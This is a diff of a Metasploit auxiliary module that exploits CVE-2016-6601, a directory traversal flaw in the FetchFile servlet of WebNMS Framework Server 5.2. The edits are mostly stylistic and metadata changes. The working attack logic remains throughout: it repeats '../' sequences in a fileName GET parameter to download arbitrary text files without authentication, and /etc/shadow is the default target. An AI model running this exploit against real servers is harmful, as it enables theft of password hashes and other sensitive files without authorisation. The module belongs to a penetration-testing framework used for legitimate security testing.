@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
@@ -14,36 +12,39 @@ class MetasploitModule < Msf::Auxiliary
       update_info(
         info,
         'Name' => 'WebNMS Framework Server Arbitrary Text File Download',
-        'Description' => %q(
-This module abuses a vulnerability in WebNMS Framework Server 5.2 that allows an
-unauthenticated user to download files off the file system by using a directory
-traversal attack on the FetchFile servlet.
-Note that only text files can be downloaded properly, as any binary file will get
-mangled by the servlet. Also note that for Windows targets you can only download
-files that are in the same drive as the WebNMS installation.
-This module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on
-Windows and Linux.
-),
-        'Author' =>
-          [
-            'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
-          ],
+        'Description' => %q{
+          This module abuses a vulnerability in WebNMS Framework Server 5.2 that allows an
+          unauthenticated user to download files off the file system by using a directory
+          traversal attack on the FetchFile servlet.
+          Note that only text files can be downloaded properly, as any binary file will get
+          mangled by the servlet. Also note that for Windows targets you can only download
+          files that are in the same drive as the WebNMS installation.
+          This module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on
+          Windows and Linux.
+        },
+        'Author' => [
+          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
+        ],
         'License' => MSF_LICENSE,
-        'References' =>
-          [
-            [ 'CVE', '2016-6601'],
-            [ 'URL', 'https://blogs.securiteam.com/index.php/archives/2712' ],
-            [ 'URL', 'http://seclists.org/fulldisclosure/2016/Aug/54' ]
-          ],
-        'DisclosureDate' => 'Jul 4 2016'
+        'References' => [
+          [ 'CVE', '2016-6601'],
+          [ 'URL', 'https://blogs.securiteam.com/index.php/archives/2712' ],
+          [ 'URL', 'https://seclists.org/fulldisclosure/2016/Aug/54' ]
+        ],
+        'DisclosureDate' => '2016-07-04',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
     register_options(
       [
         OptPort.new('RPORT', [true, 'The target port', 9090]),
-        OptString.new('TARGETURI', [ true, "WebNMS path", '/']),
-        OptString.new('FILEPATH', [ false, "The filepath of the file you want to download", '/etc/shadow']),
-        OptString.new('TRAVERSAL_PATH', [ false, "The traversal path to the target file (if you know it)"]),
+        OptString.new('TARGETURI', [ true, 'WebNMS path', '/']),
+        OptString.new('FILEPATH', [ false, 'The filepath of the file you want to download', '/etc/shadow']),
+        OptString.new('TRAVERSAL_PATH', [ false, 'The traversal path to the target file (if you know it)']),
         OptInt.new('MAX_TRAVERSAL', [ false, "Maximum traversal path depth (if you don't know the traversal path)", 10])
       ],
       self.class
@@ -87,19 +88,19 @@ Windows and Linux.
         print_good("File download successful, file saved in #{path}")
       end
     else
-      print_error("Module Failed: Invalid Filename")
+      print_error('Module Failed: Invalid Filename')
     end
   end
 
   def get_file(path, depth)
     while depth > 0
-      file_name = "../" * depth + path
+      file_name = '../' * depth + path
       vprint_status("Attempting to get file: #{file_name}")
       begin
         res = send_request_cgi(
           {
-            'uri'      => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),
-            'method'   => 'GET',
+            'uri' => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),
+            'method' => 'GET',
             'vars_get' => { 'fileName' => file_name }
           }
         )
@@ -111,9 +112,10 @@ Windows and Linux.
       if res &&
          res.code == 200 &&
          !res.body.to_s.empty? &&
-         (res.body.to_s.include? "File Found")
+         (res.body.to_s.include? 'File Found')
         return res.body.to_s
       end
+
       depth -= 1
     end
   end
